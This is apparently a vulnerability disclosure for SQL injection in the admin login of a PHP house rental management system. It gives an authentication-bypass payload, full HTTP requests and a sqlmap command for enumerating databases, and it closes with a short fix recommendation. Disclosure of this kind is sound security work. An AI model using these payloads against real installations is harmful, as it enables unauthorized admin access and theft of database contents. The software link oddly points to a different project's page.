# house rental management system - SQL Injection (Admin Login)

### Vendor Homepage:

> [https://www.sourcecodester.com](https://www.sourcecodester.com/)

### Software Link:

> [house rental management system](https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /rental_0/rental/ajax.php?action=login

> One parameters `username`  within admin login mechanism are vulnerable to SQL Injection.

In the admin_class.php code of the login process, it can be seen that no validation is performed on the username parameter and it is directly spliced into the SQL statement, leading to the possibility of SQL injection.

![img](https://raw.githubusercontent.com/baineoli/CVE/refs/heads/main/2024/images/house1.png)



### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### Manual Exploitation

The payload `' and 1=1-- -` can be used to bypass authentication within admin login page.

```
POST /rental_0/rental/ajax.php?action=login HTTP/1.1
Host: 192.168.31.254
Content-Length: 65
Accept: */*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.31.254
Referer: http://192.168.31.254/rental_0/rental/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ocid21dptfkqdhrdg4idon0mnn
Connection: keep-alive

username=mayuri.infospace%40gmail.com'+and+1%3D1--+-&password=123
```



### SQLMap

Save the following request to `admin_login.txt`:

```
POST /rental_0/rental/ajax.php?action=login HTTP/1.1
Host: 192.168.31.254
Content-Length: 65
Accept: */*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.31.254
Referer: http://192.168.31.254/rental_0/rental/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ocid21dptfkqdhrdg4idon0mnn
Connection: keep-alive

username=mayuri.infospace%40gmail.com'&password=123
```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
python sqlmap.py -r admin_login.txt --level 5 --risk 3 --batch --dbs
```

## Recommendations

When using this rental housing management system, the application code must be updated to ensure sanitization of user input and proper restrictions on special characters.